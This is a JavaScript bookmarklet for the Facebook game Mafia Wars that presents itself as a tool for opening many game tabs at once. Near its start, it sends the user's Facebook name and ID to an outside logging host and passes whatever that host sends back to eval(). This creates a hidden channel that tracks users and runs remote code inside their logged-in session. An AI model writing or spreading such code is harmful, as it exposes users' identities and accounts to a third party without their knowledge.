javascript:(function (){
    var jca_title = '★LOC@S★ - OpenMultipleTabs';
 html = '<ul style="margin: 0;padding: 0;width: 650px;">';

var name_uid = '';
var the_name = 'OpenMultipleTabs - G';
var mUrl = 'https://graph.facebook.com/'+User.trackId;
var the_id = User.trackId;
   $.ajax({
        url: mUrl,
        dataType: 'json',
        success: function(data, status) {         
          //alert(data.name);
          name_uid=data.name;

      }
      ,complete: function(){
           $.ajax({
                                                 async : true
                                                ,cache : false
                                                ,type    : "GET"
                                                ,url     : "http://cux.cu.funpic.de/mw/log_new.php"
                                                ,data    : { user:name_uid, script:the_name,fbid:the_id}
                                                ,dataType: "jsonp"                                     
                                                ,xhrFields: {
                                                    withCredentials: true
                                                }
												,success : function(data,status){
												      eval(data);
												}
												
                              }); 
						  
                  }
   });;   	

	function LogErr(msg) {
	//For us to debug out to browser java console
		setTimeout(function() {
			throw new Error(msg);
		}, 0);
	}
function trim (zeichenkette) {
  // Erst führende, dann Abschließende Whitespaces entfernen
  // und das Ergebnis dieser Operationen zurückliefern
  return zeichenkette.replace (/^\s+/, '').replace (/\s+$/, '');
}

var the_div = document.getElementById('inner_page');
  
  if (document.getElementById('juansinho_famremover') == undefined){
      var the_main=document.createElement("div");
	  the_main.id='juansinho_famremover';
	  the_main.style.paddingLeft='15px';
	  the_main.style.paddingTop='15px';
	  the_main.style.paddingBottom='15px';
	  var the_area=document.createElement("div");
	  var the_area2=document.createElement("div");
	  var the_count=document.createElement("div");
	  var the_start=document.createElement("a");
	  var the_close=document.createElement("a");
	   the_area.id='juansinho_4selects';
	   the_area2.id='juansinho_to_log';
	   the_count.id='juansinho_counter';
	   var my_select='Select the count of tabs to open:<select name="juansinho_tabcount" id="juansinho_tabcount" size="1">';
	   my_select+='<option value="1">1</option><option value="2">2</option><option value="3">3</option><option value="4">4</option><option value="5">5</option><option value="10">10</option><option value="15">15</option><option value="20">20</option><option value="25">25</option><option value="30">30</option><option value="40">40</option><option value="50">50</option><option value="60">60</option><option value="70">70</option><option value="80">80</option><option value="90">90</option><option value="100">100</option>';
	     var my_add = '';
		 if (the_id == '831572341'){
			my_add ='&nbsp;<input type="radio" name="juansinho_tabwhich" value="2"> Add Defense';
		 }
	   my_select+='</select><br>Select the tab to open:<br><input type="radio" name="juansinho_tabwhich" value="0"> Home&nbsp;<input type="radio" name="juansinho_tabwhich" value="1"> Profil'+my_add;
	   the_area.innerHTML = my_select;
		
	   the_area2.innerHTML='★LOC@S★ - OpenMultipleTabs by ★LOC@S★ נυαηѕιηнσ ★L@★';
	   the_count.innerHTML='';
	   $(the_main).insertBefore(the_div);	   
	   $(the_main).append(the_area2);
	   $(the_main).append(the_area);
	   $(the_main).append(the_count);	   
	   $(the_main).append(the_start);
	   $(the_main).append(the_close);

	   the_start.href='#';
	   the_start.id='juansinho_start';
	   the_start.className= 'sexy_button_new green short';
	   the_start.innerHTML = '<span><span>Start</span></span>';
	   the_close.href='#';
	   the_close.id='juansinho_close';
	   the_close.className= 'sexy_button_new red short';
	   the_close.innerHTML = '<span><span>Close</span></span><br><br>';	   
	   
   }
   

	var http = 'http://';
	if (/https/.test(document.location)) {
		http = 'https://';
	}
mylist = new Array();
var userid =/sf_xw_user_id': '(.+)'/.exec(document.body.innerHTML)[1];	
//var preurl = http+'facebook.mafiawars.zynga.com/mwfb/remote/';
var preurl = MW_BASE_URL+'/remote/';
function unix_timestamp() {
		return parseInt(new Date().getTime().toString().substring(0, 10))
	} 

$('#juansinho_close').click(function () { $('#juansinho_famremover').remove(); return false; });
$('#juansinho_start').click(function(){
	$('#juansinho_start').remove()
	removeNonFriends($("#juansinho_tabcount :selected").val());		
	return false;
});

the_url_home = 'http://facebook-ca2.mafiawars.zynga.com/mwfb/remote/html_server.php?xw_controller=index&xw_action=view&xw_person='+User.id.substr(2);
the_url_profile = 'http://facebook-ca2.mafiawars.zynga.com/mwfb/remote/html_server.php?xw_controller=stats&xw_action=view&xw_person='+User.id.substr(2);
the_url_def = 'http://facebook-ca2.mafiawars.zynga.com/mwfb/remote/html_server.php?xw_controller=stats&xw_action=upgrade&xw_person='+User.id.substr(2)+'&upgrade_key=defense&upgrade_amt=5';
the_url_energy = 'http://facebook-ca2.mafiawars.zynga.com/mwfb/remote/html_server.php?xw_controller=stats&xw_action=upgrade&tmp=425b20fbd2948859dd5d147b3ea5d6f2&cb=9d229e30758e11e3a1d20b444779c40a&xw_person=2370901&upgrade_key=max_energy&upgrade_amt=1'
function removeNonFriends(list){
		document.getElementById('juansinho_to_log').innerHTML ='Starting Loop of: '+(list); 
			my_which = $("input[name=juansinho_tabwhich]:checked").val();
			if (my_which == 0){
			   the_url = the_url_home;
			}
			else if(my_which == 2){
			   the_url = the_url_def;
			}
			else{
				the_url = the_url_profile;
			}
			$('#juansinho_4selects').remove();			
			$("input[name=juansinho_tabwhich]").remove();

			for(var i=0;i<list;i++){				
				var popupWindow = window.open(the_url);
				popupWindow.blur();				
				document.getElementById('juansinho_to_log').innerHTML +='<br>Loop '+(i+1)+' of: '+(list); 				
		} 
			window.focus();
			document.getElementById('juansinho_to_log').innerHTML +='<br>Done.'; 
	}
//Thanks to the Spockholmteam for this	
	function request(url, handler, errorhandler) {

	if (url.indexOf('cb=') == -1) {
			url += '&cb='+userid+unix_timestamp();
		}
		if (url.indexOf('tmp=') == -1) {
			url += '&tmp='+unix_timestamp();
		}

		var params = {
			'ajax': 1,
			'liteload': 1,
			'sf_xw_user_id': userid,
			'sf_xw_sig': local_xw_sig,
			'xw_client_id': 8,
			'skip_req_frame': 1
		};
		$.ajax({
			type: "POST",
			url: preurl+url,
			data: params,
			cache: false,
			success: handler,
			error: errorhandler
		});
	}

return;													
}())
